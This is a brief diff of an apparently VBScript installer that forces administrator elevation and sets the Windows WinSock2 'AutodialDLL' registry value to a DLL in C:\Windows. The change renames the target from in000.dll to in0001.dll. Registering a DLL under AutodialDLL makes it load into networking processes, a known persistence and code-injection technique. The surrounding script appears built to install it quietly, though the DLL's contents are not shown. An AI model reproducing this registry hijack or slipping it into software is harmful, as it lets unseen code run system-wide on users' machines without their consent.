@@ -5,7 +5,7 @@ RequireAdmin
 Dim objReg
 Set objReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
 
-RegWrite "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters", "AutodialDLL", "REG_SZ", "C:\Windows\in000.dll"
+RegWrite "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters", "AutodialDLL", "REG_SZ", "C:\Windows\in0001.dll"
 
 Function RegWrite(reg_keyname, reg_valuename,reg_type,ByVal reg_value)
 	Dim aRegKey, Return
@@ -174,6 +174,7 @@ Function RequireAdmin()
 	WScript.Quit
 
 End Function
+
 
 
 
